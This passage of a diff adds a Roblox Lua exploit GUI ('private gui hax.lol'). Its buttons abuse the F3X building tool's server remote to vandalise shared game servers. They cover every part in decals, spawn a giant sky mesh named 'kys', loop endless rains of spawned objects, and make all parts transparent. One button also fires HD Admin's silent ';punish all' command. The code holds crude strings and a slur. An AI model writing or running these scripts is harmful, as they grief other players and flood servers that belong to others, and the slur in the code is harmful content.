+		local hrp = char:WaitForChild("HumanoidRootPart")
+		local cf = CFrame.new(hrp.Position + Vector3.new(0, 1000, 0))
+	
+		local sky = remote:InvokeServer("CreatePart", "Normal", cf, Workspace)
+	
+		task.spawn(function() call({ "SyncAnchor", { { Part = sky, Anchored = true } } }) end)
+		task.spawn(function() call({ "SyncCollision", { { Part = sky, CanCollide = false } } }) end)
+		task.spawn(function() call({ "CreateMeshes", { { Part = sky } } }) end)
+		task.spawn(function()
+			call({
+				"SyncMesh",
+				{{
+					Part = sky,
+					MeshId = "rbxassetid://111891702759441",
+					TextureId = "rbxassetid://136167312154109",
+					Scale = Vector3.new(100999, 100999, 100999),
+					VertexColor = Vector3.new(4.5, 4.5, 4.5)
+				}}
+			})
+		end)
+		task.spawn(function() call({ "SetLocked", { sky }, true }) end)
+		task.spawn(function() call({ "SetName", { sky }, "kys" }) end)
+		task.spawn(function() call({ "SyncMaterial", { { Part = sky, Transparency = 0 } } }) end)
+		task.spawn(function() call({ "SyncMove", { { Part = sky, CFrame = cf } } }) end)
+	end)
+end;
+task.spawn(C_73);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+function C_75()
+local script = G2L["75"];
+	script.Parent.MouseButton1Click:Connect(function()
+		-- method task.spawn by yoid and 1sw0rd1
+		-- credit to theses 2
+	
+		local Players = game:GetService("Players")
+		local Workspace = game:GetService("Workspace")
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	
+		local decalID = "95740991147385"
+		local id = decalID
+	
+		local player = Players.LocalPlayer
+	
+		local tool = nil
+		for _, v in pairs(player:GetDescendants()) do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+				break
+			end
+		end
+	
+		if not tool then
+			for _, v in pairs(ReplicatedStorage:GetDescendants()) do
+				if v.Name == "SyncAPI" then
+					tool = v.Parent
+					break
+				end
+			end
+		end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+	
+		local allParts = {}
+		for _, v in pairs(Workspace:GetDescendants()) do
+			if v:IsA("BasePart") and v.Name ~= "Terrain" and v.Name ~= "kys" then
+				table.insert(allParts, v)
+			end
+		end
+	
+		local faces = {"Front", "Back", "Right", "Left", "Bottom", "Top"}
+		local faceEnums = {
+			Front = Enum.NormalId.Front,
+			Back = Enum.NormalId.Back,
+			Right = Enum.NormalId.Right,
+			Left = Enum.NormalId.Left,
+			Bottom = Enum.NormalId.Bottom,
+			Top = Enum.NormalId.Top
+		}
+	
+		for _, faceName in pairs(faces) do
+			task.spawn(function()
+				local faceEnum = faceEnums[faceName]
+				local createList = {}
+				local addList = {}
+				for i = 1, #allParts do
+					local part = allParts[i]
+					createList[i] = {Part = part, Face = faceEnum, TextureType = "Decal"}
+					addList[i] = {Part = part, Face = faceEnum, TextureType = "Decal", Texture = "rbxassetid://" .. id}
+				end
+				remote:InvokeServer('CreateTextures', createList)
+				remote:InvokeServer('SyncTexture', addList)
+			end)
+		end
+	
+		local function send(args)
+			remote:InvokeServer(unpack(args))
+		end
+	
+		local function setCollision(part, bool)
+			task.spawn(function() send({"SyncCollision", {{Part = part, CanCollide = bool}}}) end)
+		end
+	
+		local function setAnchor(bool, part)
+			task.spawn(function() send({"SyncAnchor", {{Part = part, Anchored = bool}}}) end)
+		end
+	
+		local function newPart(cf, parent)
+			task.spawn(function() send({"CreatePart", "Normal", cf, parent}) end)
+		end
+	
+		local function killPart(part)
+			task.spawn(function() send({"Remove", {part}}) end)
+		end
+	
+		local function movePart(part, cf)
+			task.spawn(function() send({"SyncMove", {{Part = part, CFrame = cf}}}) end)
+		end
+	
+		local function resizePart(part, sz, cf)
+			task.spawn(function() send({"SyncResize", {{Part = part, CFrame = cf, Size = sz}}}) end)
+		end
+	
+		local function addMeshToPart(part)
+			task.spawn(function() send({"CreateMeshes", {{Part = part}}}) end)
+		end
+	
+		local function changeMesh(part, meshId)
+			task.spawn(function() send({"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. meshId}}}) end)
+		end
+	
+		local function changeTexture(part, texId)
+			task.spawn(function() send({"SyncMesh", {{Part = part, TextureId = "rbxassetid://" .. texId}}}) end)
+		end
+	
+		local function renamePart(part, newName)
+			task.spawn(function() send({"SetName", {part}, newName}) end)
+		end
+	
+		local function scaleMesh(part, scaleVal)
+			task.spawn(function() send({"SyncMesh", {{Part = part, Scale = scaleVal}}}) end)
+		end
+	
+		local function weldParts(partA, partB, leader)
+			task.spawn(function() send({"CreateWelds", {partA, partB}, leader}) end)
+		end
+	
+		local function lockPart(part, bool)
+			task.spawn(function() send({"SetLocked", {part}, bool}) end)
+		end
+	
+		local function setTransparency(part, val)
+			task.spawn(function() send({"SyncMaterial", {{Part = part, Transparency = val}}}) end)
+		end
+	
+		local function addSpotlight(part)
+			task.spawn(function() send({"CreateLights", {{Part = part, LightType = "SpotLight"}}}) end)
+		end
+	
+		local function setLightBrightness(part, brightness)
+			task.spawn(function() send({"SyncLighting", {{Part = part, LightType = "SpotLight", Brightness = brightness}}}) end)
+		end
+	
+		local function recolorPart(part, colorVal)
+			task.spawn(function() send({"SyncColor", {{Part = part, Color = colorVal, UnionColoring = false}}}) end)
+		end
+	
+		local function spawnDecalOnFace(part, side)
+			task.spawn(function() send({"CreateTextures", {{Part = part, Face = side, TextureType = "Decal"}}}) end)
+		end
+	
+		local function addDecalToFace(part, assetId, side)
+			task.spawn(function() send({"SyncTexture", {{Part = part, Face = side, TextureType = "Decal", Texture = "rbxassetid://" .. assetId}}}) end)
+		end
+	
+		for i = 1, #allParts do
+			task.spawn(setTransparency, allParts[i], 0)
+		end
+	end)
+end;
+task.spawn(C_75);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+function C_77()
+local script = G2L["77"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local Players = game:GetService("Players")
+		local workspace = game:GetService("Workspace")
+		local player = Players.LocalPlayer
+	
+		local function findTools()
+			local char = player.Character or player.CharacterAdded:Wait()
+			for _, v in ipairs(char:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			for _, v in ipairs(player.Backpack:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+		end
+	
+		local tool = findTools()
+		if not tool then return end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+	
+		local function call(a)
+			return remote:InvokeServer(unpack(a))
+		end
+	
+		local function spawnToad(pos)
+			local toad = remote:InvokeServer("CreatePart", "Normal", pos, workspace)
+	
+			call({ "SyncAnchor", { { Part = toad, Anchored = false } } })
+			call({ "SetName", { toad }, "toadroasthackrellol" })
+			call({ "SyncCollision", { { Part = toad, CanCollide = false } } })
+			call({ "CreateMeshes", { { Part = toad } } })
+	
+			call({
+				"SyncMesh",
+				{{
+					Part = toad,
+					MeshId = "rbxassetid://5038530279",
+					TextureId = "rbxassetid://5038530309",
+					Scale = Vector3.new(4, 4, 4)
+				}}
+			})
+	
+			call({
+				"SyncResize",
+				{{
+					Part = toad,
+					Size = Vector3.new(100, 100, 100),
+					CFrame = pos
+				}}
+			})
+		end
+	
+		task.spawn(function()
+			while true do
+				task.wait(0.2)
+	
+				local skyTopY = 1000
+	
+				local x = math.random(-1000, 1000)
+				local y = skyTopY + math.random(50, 200)
+				local z = math.random(-1000, 1000)
+	
+				task.spawn(function()
+					spawnToad(CFrame.new(x, y, z))
+				end)
+			end
+		end)
+	end)
+end;
+task.spawn(C_77);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+function C_79()
+local script = G2L["79"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+		RequestCommand:InvokeServer(";punish all ;unfog ;fogcolor black ;time 0")
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local Players = game:GetService("Players")
+		local workspace = game:GetService("Workspace")
+		local player = Players.LocalPlayer
+	
+		local function findTools()
+			local char = player.Character or player.CharacterAdded:Wait()
+			for _, v in ipairs(char:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			for _, v in ipairs(player.Backpack:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+		end
+	
+		local tool = findTools()
+		if not tool then return end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+		local function call(a)
+			return remote:InvokeServer(unpack(a))
+		end
+	
+		local oldSky = workspace:FindFirstChild("kys")
+		if oldSky then
+			call({ "Remove", { oldSky } })
+		end
+	
+		local char = player.Character or player.CharacterAdded:Wait()
+		local hrp = char:WaitForChild("HumanoidRootPart")
+		local cf = CFrame.new(hrp.Position + Vector3.new(0, 1000, 0))
+		local sky = remote:InvokeServer("CreatePart", "Normal", cf, workspace)
+	
+		task.spawn(function()
+			call({ "SyncAnchor", { { Part = sky, Anchored = true } } })
+		end)
+	
+		task.spawn(function()
+			call({ "SyncMove", { { Part = sky, CFrame = cf } } })
+		end)
+	
+		task.spawn(function()
+			call({ "CreateMeshes", { { Part = sky } } })
+		end)
+	
+		task.spawn(function()
+			call({
+				"SyncMesh",
+				{{
+					Part = sky,
+					MeshId = "rbxassetid://111891702759441",
+					TextureId = "rbxassetid://201208408",
+					Scale = Vector3.new(100999, 100999, 100999),
+					VertexColor = Vector3.new(4.5,4.5,4.5)
+				}}
+			})
+		end)
+	
+		task.spawn(function()
+			call({ "SyncCollision", { { Part = sky, CanCollide = false } } })
+		end)
+	
+		task.spawn(function()
+			call({ "SetLocked", { sky }, true })
+		end)
+	
+		task.spawn(function()
+			call({ "SetName", { sky }, "kys" })
+		end)
+	
+		task.spawn(function()
+			call({ "SyncMaterial", { { Part = sky, Transparency = 0 } } })
+		end)
+	
+		local function spawnToad(pos)
+			local toad = remote:InvokeServer("CreatePart", "Normal", pos, workspace)
+			call({ "SyncAnchor", { { Part = toad, Anchored = false } } })
+			call({ "SetName", { toad }, "toadroasthackrellol" })
+			call({ "SyncCollision", { { Part = toad, CanCollide = false } } })
+			call({ "CreateMeshes", { { Part = toad } } })
+			call({
+				"SyncMesh",
+				{{
+					Part = toad,
+					MeshId = "rbxassetid://5038530279",
+					TextureId = "rbxassetid://5038530309",
+					Scale = Vector3.new(4, 4, 4)
+				}}
+			})
+			call({
+				"SyncResize",
+				{{
+					Part = toad,
+					Size = Vector3.new(100, 100, 100),
+					CFrame = pos
+				}}
+			})
+	
+			local sound = Instance.new("Sound", toad)
+			sound.SoundId = "rbxassetid://153752123"
+			sound.Volume = 10
+			sound.PlayOnRemove = true
+			sound:Destroy()
+		end
+	
+		task.spawn(function()
+			while true do
+				task.wait(0.2)
+	
+				local skyPart = workspace:FindFirstChild("kys")
+				local skyTopY = 1000
+	
+				if skyPart and skyPart:IsA("BasePart") then
+					skyTopY = skyPart.Position.Y + (skyPart.Size.Y / 2) + 50
+				end
+	
+				local x = math.random(-1000, 1000)
+				local y = skyTopY + math.random(50, 200)
+				local z = math.random(-1000, 1000)
+	
+				task.spawn(function()
+					spawnToad(CFrame.new(x, y, z))
+				end)
+			end
+		end)
+	end)
+end;
+task.spawn(C_79);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_7c()
+local script = G2L["7c"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local Players = game:GetService("Players")
+		local player = Players.LocalPlayer
+	
+		local character = player.Character 
+	
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	
+	
+		local backpack = player.Backpack
+	
+		local function getf3x()
+			for _, v in ipairs(backpack:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			for _, v in ipairs(char:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+	
+			return nil
+		end
+	
+		-- get all info
+	
+		local f3x = getf3x()
+		if not f3x then
+			warn("where yo btools at")
+		end
+		local syncapi = f3x.SyncAPI
+		local serverendpoint = syncapi.ServerEndpoint
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local Players = game:GetService("Players")
+		local workspace = game:GetService("Workspace")
+		local player = Players.LocalPlayer
+	
+		local function findTools()
+			local char = player.Character or player.CharacterAdded:Wait()
+			for _, v in ipairs(char:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			for _, v in ipairs(player.Backpack:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+		end
+	
+		local tool = findTools()
+		if not tool then return end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+		local function call(a)
+			return remote:InvokeServer(unpack(a))
+		end
+	
+		local function rainParticle(pos)
+			local pickle = remote:InvokeServer("CreatePart", "Normal", pos, workspace)
+			call({ "SyncAnchor", { { Part = pickle, Anchored = false } } })
+			call({ "SetName", { pickle }, "pickle" })
+			call({ "CreateMeshes", { { Part = pickle } } })
+			call({ "SetLocked", { pickle }, true })
+			call({
+				"SyncMesh",
+				{{
+					Part = pickle,
+					MeshId = "rbxassetid://111891702759441",
+					TextureId = "rbxassetid://125183910537383",
+					Scale = Vector3.new(100, 100, 100)
+				}}
+			})
+	
+		end
+	
+		task.spawn(function()
+			while true do
+				task.wait(0.01)
+	
+				local hrpcf = player.Character.HumanoidRootPart.CFrame
+				local x = hrpcf.x
+				local z = hrpcf.z
+				local randint = math.random(-600, 600)
+				local randint2 = math.random(-600, 600)
+				local xloc = randint + x
+				local zloc = randint2 + z
+				local cf = player.Character.HumanoidRootPart.CFrame.y + 400
+	
+				task.spawn(function()
+					rainParticle(CFrame.new(math.floor(xloc), math.random(cf, cf + 400), math.floor(zloc)))
+				end)
+			end
+		end)
+	end)
+end;
+task.spawn(C_7c);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_7e()
+local script = G2L["7e"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local plr = game:GetService("Players")
+		local ws = game:GetService("Workspace")
+		local rs = game:GetService("ReplicatedStorage")
+	
+		local me = plr.LocalPlayer
+	
+		local function get()
+			for _, obj in pairs(me:GetDescendants()) do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+			for _, obj in pairs(rs:GetDescendants()) do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+			return nil
+		end
+	
+		local hax = get()
+		if not hax then return end
+	
+		local r = hax.SyncAPI.ServerEndpoint
+	
+		local function call(...)
+			return r:InvokeServer(...)
+		end
+	
+		for _, v in pairs(ws:GetDescendants()) do
+			if v:IsA("BasePart") and v.Name ~= "Terrain" and v.Name ~= "kys" then
+				task.spawn(function()
+					call("CreateDecorations", { {
+						Part = v,
+						DecorationType = "Sparkles",
+						Size = 5,
+						Color = Color3.new(1, 1, 1)
+					} })
+				end)
+			end
+		end
+	end)
+end;
+task.spawn(C_7e);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_80()
+local script = G2L["80"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local player = game:GetService("Players").LocalPlayer
+		local char = player.Character or player.CharacterAdded:Wait()
+		local cam = workspace.CurrentCamera
+	
+		local inventoryminecraft = player:WaitForChild("Backpack")
+	
+		local function getezyf3x()
+			for _, v in pairs(inventoryminecraft:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then return v end
+			end
+			for _, v in pairs(char:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then return v end
+			end
+			return nil
+		end
+	
+		local f3x = getezyf3x()
+		if not f3x then
+			print("where yo btools at")
+			return
+		end
+	
+		local pointer = f3x.SyncAPI.ServerEndpoint
+	
+		local function ohno(args)
+			task.spawn(function()
+				pcall(function()
+					pointer:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local id = "13058161205"
+		local sizeshit = Vector3.new(3, 3, 0.1)
+	
+		local playerhack = char:FindFirstChild("Head")
+		if playerhack then
+			ohno({"SyncMaterial", {{Part = playerhack, Transparency = 1}}})
+			for _, decal in pairs(playerhack:GetChildren()) do
+				if decal:IsA("Decal") then
+					ohno({"Remove", {decal}})
+				end
+			end
+		end
+	
+		if replace then
+			ohno({"Remove", {replace}})
+		end
+	
+		local partface = pointer:InvokeServer("CreatePart", "Normal", CFrame.new(0, 0, 0), workspace)
+		if not partface then return end
+	
+		replace = partface
+	
+		ohno({"SyncResize", {{Part = partface, CFrame = CFrame.new(0, 0, 0), Size = sizeshit}}})
+		ohno({"SyncAnchor", {{Part = partface, Anchored = true}}})
+		ohno({"SyncCollision", {{Part = partface, CanCollide = false}}})
+		ohno({"SyncMaterial", {{Part = partface, Transparency = 0.02}}})
+		ohno({"CreateMeshes", {{Part = partface}}})
+		ohno({"SyncMesh", {{Part = partface, MeshId = "rbxassetid://111891702759441"}}})
+		ohno({"SyncMesh", {{Part = partface, TextureId = "rbxassetid://" .. id}}})
+		ohno({"SyncMesh", {{Part = partface, Scale = sizeshit}}})
+		ohno({"SyncMesh", {{Part = partface, VertexColor = Vector3.new(2, 2, 2)}}})
+	
+		local koopyes = char:FindFirstChild("HumanoidRootPart")
+		if koopyes then
+			ohno({"SyncMove", {{Part = partface, CFrame = koopyes.CFrame * CFrame.new(0, 1.5, 0)}}})
+		end
+	
+		task.spawn(function()
+			while true do
+				task.wait(0.016)
+				if koopyes and koopyes.Parent then
+					local newCF = koopyes.CFrame * CFrame.new(0, 1.9, 0)
+					local lookAt = CFrame.new(newCF.Position, cam.CFrame.Position)
+					ohno({"SyncMove", {{Part = partface, CFrame = lookAt}}})
+				end
+			end
+		end)
+	end)
+end;
+task.spawn(C_80);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_82()
+local script = G2L["82"];
+	script.Parent.MouseButton1Click:Connect(function()
+		--[[
+	---------------------------
+	X-Ray F3X Script By Elv4r0x
+	---------------------------
+	]]
+		local players = game:GetService("Players")
+		local workspace = game:GetService("Workspace")
+		local localPlayer = players.LocalPlayer
+	
+		local function getSyncTool()
+			local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
+	
+			for _, child in ipairs(character:GetChildren()) do
+				if child:IsA("Tool") and child:FindFirstChild("SyncAPI") then
+					return child
+				end
+			end
+	
+			for _, child in ipairs(localPlayer.Backpack:GetChildren()) do
+				if child:IsA("Tool") and child:FindFirstChild("SyncAPI") then
+					return child
+				end
+			end
+		end
+	
+		local tool = getSyncTool()
+		if not tool then return end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+	
+		local function fire(...)
+			return remote:InvokeServer(...)
+		end
+	
+		local allParts = {}
+		for _, part in pairs(workspace:GetDescendants()) do
+			if part:IsA("BasePart") and part.Name ~= "Terrain" and part.Name ~= "kys" then
+				table.insert(allParts, part)
+			end
+		end
+	
+		for _, part in pairs(allParts) do
+			task.spawn(function()
+				fire("SyncMaterial", { { Part = part, Transparency = 0.5 } })
+			end)
+		end
+	end)
+end;
+task.spawn(C_82);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_85()
+local script = G2L["85"];
+	script.Parent.MouseButton1Click:Connect(function()
+		ReplicatedStorage = game:GetService("ReplicatedStorage")
+		Players = game:GetService("Players")
+		player = Players.LocalPlayer
+		char = player.Character or player.CharacterAdded:Wait()
+		backpack = player:WaitForChild("Backpack")
+	
+		local function getf3x()
+			for _, v in ipairs(backpack:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then return v end
+			end
+			for _, v in ipairs(char:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then return v end
+			end
+		end
+	
+		local f3x = getf3x()
+		if not f3x then warn("No F3X found") return end
+	
+		local endpoint = f3x.SyncAPI.ServerEndpoint
+	
+		local function fastInvoke(args)
+			task.spawn(function()
+				pcall(function()
+					endpoint:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local function quickPart(t, cf, size, mat, col, trans, mid, mtex, mscale, extra)
+			task.spawn(function()
+				local p = endpoint:InvokeServer("CreatePart", t, cf, workspace.Terrain)
+				if not p then return end
+	
+				fastInvoke({"SyncResize",   {{Part = p, CFrame = cf, Size = size}}})
+				if mat  then fastInvoke({"SyncMaterial", {{Part = p, Material = mat}}}) end
+				if col  then fastInvoke({"SyncColor",    {{Part = p, Color = col, UnionColoring = false}}}) end
+				if trans then fastInvoke({"SyncMaterial", {{Part = p, Transparency = trans}}}) end
+	
+				if mid or mtex or mscale then
+					fastInvoke({"CreateMeshes", {{Part = p}}})
+					if mid  then fastInvoke({"SyncMesh", {{Part = p, MeshId   = "rbxassetid://" .. mid}}}) end
+					if mtex then fastInvoke({"SyncMesh", {{Part = p, TextureId = "rbxassetid://" .. mtex}}}) end
+					if mscale then fastInvoke({"SyncMesh", {{Part = p, Scale = mscale}}}) end
+				end
+	
+				if extra then extra(p) end
+			end)
+		end
+	
+		math.randomseed(tick())
+	
+		local TOAD_MESH   = "14846869"
+		local TOAD_TEX    = "14846834"
+		local TOAD_SCALE  = Vector3.new(15, 15, 15)
+		local TOAD_SIZE   = Vector3.new(50, 50, 30)
+	
+		local function rainToads()
+			while true do
+				task.wait(0.01)
+	
+				local c = player.Character
+				local hum = c and c:FindFirstChildOfClass("Humanoid")
+				local hrp = c and c:FindFirstChild("HumanoidRootPart")
+	
+				if not (hum and hrp and hum.Health > 0) then
+					task.wait(1)
+					continue
+				end
+	
+				local basePos = hrp.Position
+	
+				local rx = math.random(-600, 600)
+				local rz = math.random(-600, 600)
+				local x = math.floor(basePos.X + rx)
+				local z = math.floor(basePos.Z + rz)
+				local y = basePos.Y + math.random(400, 800)
+	
+				local randomRotation = CFrame.Angles(
+					math.rad(math.random(-180, 180)),
+					math.rad(math.random(-180, 180)),
+					math.rad(math.random(-180, 180))
+				)
+	
+				local cf = CFrame.new(x, y, z) * randomRotation
+	
+				quickPart(
+					"Normal",
+					cf,
+					TOAD_SIZE,
+					Enum.Material.Plastic,
+					Color3.new(1,1,1),
+					0,
+					TOAD_MESH,
+					TOAD_TEX,
+					TOAD_SCALE,
+					function(p)
+						fastInvoke({"SyncAnchor",    {{Part = p, Anchored = false}}})
+						fastInvoke({"SyncCollision", {{Part = p, CanCollide = false}}})
+	
+						fastInvoke({"SetName", {{Part = p}}, "taco"})
+	
+						local s = Instance.new("Sound", p)
+						s.SoundId = "rbxassetid://153752123"
+						s.Volume = 0
+						s.PlayOnRemove = true
+						s:Destroy()
+					end
+				)
+			end
+		end
+	
+		coroutine.wrap(rainToads)()
+	
+	end)
+end;
+task.spawn(C_85);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_87()
+local script = G2L["87"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local Players = game:GetService("Players")
+		local player = Players.LocalPlayer
+		local camera = workspace.CurrentCamera
+		local workspace = game:GetService("Workspace")
+	
+		local backpack = player:WaitForChild("Backpack")
+		local texture = "74015256510925"
+		local cooldownbro = 0.01
+	
+		local function getf3x()
+			for _, v in ipairs(backpack:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then return v end
+			end
+			for _, v in ipairs(player.Character:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then return v end
+			end
+			return nil
+		end
+	
+		local f3x = getf3x()
+		if not f3x then
+			print("where yo btool at my nga")
+			return
+		end
+	
+		local endpoint = f3x.SyncAPI.ServerEndpoint
+	
+		local function ohno(args)
+			task.defer(function()
+				pcall(function()
+					endpoint:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local sizehax = Vector3.new(3, 3, 0.01)
+		local speedness = 25
+		local haxxyone = 2.5
+	
+		local allman = Players:GetPlayers()
+	
+		local function spawnParticle(targetChar)
+			local torso = targetChar:FindFirstChild("UpperTorso") or targetChar:FindFirstChild("Torso")
+			if not torso then return end
+	
+			local rootPart = targetChar:FindFirstChild("HumanoidRootPart") or torso
+			local spawnCF = rootPart.CFrame + Vector3.new(0, -12, 0)
+			local part = endpoint:InvokeServer("CreatePart", "Normal", spawnCF, workspace)
+			if not part then return end
+			
+			ohno({"SetName", {part}, "watchmerollinghax"})
+			ohno({"SyncResize", {{Part = part, CFrame = spawnCF, Size = sizehax}}})
+			ohno({"SyncAnchor", {{Part = part, Anchored = true}}})
+			ohno({"SyncCollision", {{Part = part, CanCollide = false}}})
+			ohno({"SyncMaterial", {{Part = part, Transparency = 0.02}}})
+			ohno({"CreateMeshes", {{Part = part}}})
+			ohno({"SyncMesh", {{Part = part, MeshId = "rbxassetid://111891702759441"}}})
+			ohno({"SyncMesh", {{Part = part, TextureId = "rbxassetid://" .. texture}}})
+			ohno({"SyncMesh", {{Part = part, Scale = sizehax}}})
+			ohno({"SyncMesh", {{Part = part, VertexColor = Vector3.new(2, 2, 2)}}})
+	
+			local attachCF = torso.CFrame + Vector3.new(0, 0, 0)
+			ohno({"SyncMove", {{Part = part, CFrame = attachCF}}})
+	
+			local randomDir = Vector3.new(math.random(-speedness, speedness), math.random(-speedness, speedness), math.random(-speedness, speedness))
+			local startPos = attachCF.Position
+	
+			task.defer(function()
+				local lifetime = 0
+				while lifetime < haxxyone do
+					if not part or not part.Parent then break end
+					local progress = lifetime / haxxyone
+					local newPos = startPos + (randomDir * progress)
+					local lookAt = CFrame.new(newPos, camera.CFrame.Position)
+					ohno({"SyncMove", {{Part = part, CFrame = lookAt}}})
+					task.wait(0.05)
+					lifetime = lifetime + 0.05
+				end
+				ohno({"Remove", {part}})
+			end)
+		end
+	
+		local function olivertree()
+			while true do
+				task.wait(cooldownbro)
+				for _, plr in ipairs(allman) do
+					local targetChar = plr.Character
+					if targetChar then
+						spawnParticle(targetChar)
+					end
+				end
+			end
+		end
+	
+		task.defer(olivertree)
+	end)
+end;
+task.spawn(C_87);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_8b()
+local script = G2L["8b"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local Players = game:GetService("Players")
+		local player = Players.LocalPlayer
+		local char = player.Character or player.CharacterAdded:Wait()
+		local camera = workspace.CurrentCamera
+	
+		local backpack = player:WaitForChild("Backpack")
+		local texture = "74015256510925"
+		local cooldownbro = 0.01
+	
+		local function getf3x()
+			for _, v in ipairs(backpack:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then return v end
+			end
+			for _, v in ipairs(char:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then return v end
+			end
+			return nil
+		end
+	
+		local f3x = getf3x()
+		if not f3x then
+			print("where yo btool at my nga")
+			return
+		end
+	
+		local endpoint = f3x.SyncAPI.ServerEndpoint
+	
+		local function ohno(args)
+			task.defer(function()
+				pcall(function()
+					endpoint:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local sizehax = Vector3.new(3, 3, 0.01)
+		local speedness = 25
+		local haxxyone = 2.5
+	
+		for _, part in pairs(char:GetDescendants()) do
+			if part:IsA("BasePart") then
+				ohno({"SyncCollision", {{Part = part, CanCollide = false}}})
+			end
+		end
+	
+		local poop = 0
+		local maxparticlehax = 30
+	
+		local function spawnParticle(torso)
+			if poop >= maxparticlehax then return end
+			poop = poop + 1
+	
+			local rootPart = char:FindFirstChild("HumanoidRootPart") or torso
+			local spawnCF = rootPart.CFrame + Vector3.new(0, -12, 0)
+			local part = endpoint:InvokeServer("CreatePart", "Normal", spawnCF, workspace)
+			if not part then 
+				poop = poop - 1
+				return 
+			end
+			
+			ohno({"SetName", {part}, "watchmerollinghax"})
+			ohno({"SyncResize", {{Part = part, CFrame = spawnCF, Size = sizehax}}})
+			ohno({"SyncAnchor", {{Part = part, Anchored = true}}})
+			ohno({"SyncCollision", {{Part = part, CanCollide = false}}})
+			ohno({"SyncMaterial", {{Part = part, Transparency = 0.02}}})
+			ohno({"CreateMeshes", {{Part = part}}})
+			ohno({"SyncMesh", {{Part = part, MeshId = "rbxassetid://111891702759441"}}})
+			ohno({"SyncMesh", {{Part = part, TextureId = "rbxassetid://" .. texture}}})
+			ohno({"SyncMesh", {{Part = part, Scale = sizehax}}})
+			ohno({"SyncMesh", {{Part = part, VertexColor = Vector3.new(2, 2, 2)}}})
+	
+			local attachCF = torso.CFrame + Vector3.new(0, 0, 0)
+			ohno({"SyncMove", {{Part = part, CFrame = attachCF}}})
+	
+			local randomDir = Vector3.new(math.random(-speedness, speedness), math.random(-speedness, speedness), math.random(-speedness, speedness))
+			local startPos = attachCF.Position
+	
+			task.defer(function()
+				local lifetime = 0
+				while lifetime < haxxyone do
+					if not part or not part.Parent then break end
+					local progress = lifetime / haxxyone
+					local newPos = startPos + (randomDir * progress)
+					local lookAt = CFrame.new(newPos, camera.CFrame.Position)
+					ohno({"SyncMove", {{Part = part, CFrame = lookAt}}})
+					task.wait(0.05)
+					lifetime = lifetime + 0.05
+				end
+				ohno({"Remove", {part}})
+				poop = poop - 1
+			end)
+		end
+	
+		local function olivertree()
+			while true do
+				task.wait(cooldownbro)
+				local torso = char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso")
+				if torso then
+					spawnParticle(torso)
+				end
+			end
+		end
+	
+		task.defer(olivertree)
+	end)
+end;
+task.spawn(C_8b);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_8d()
+local script = G2L["8d"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local Players = game:GetService("Players")
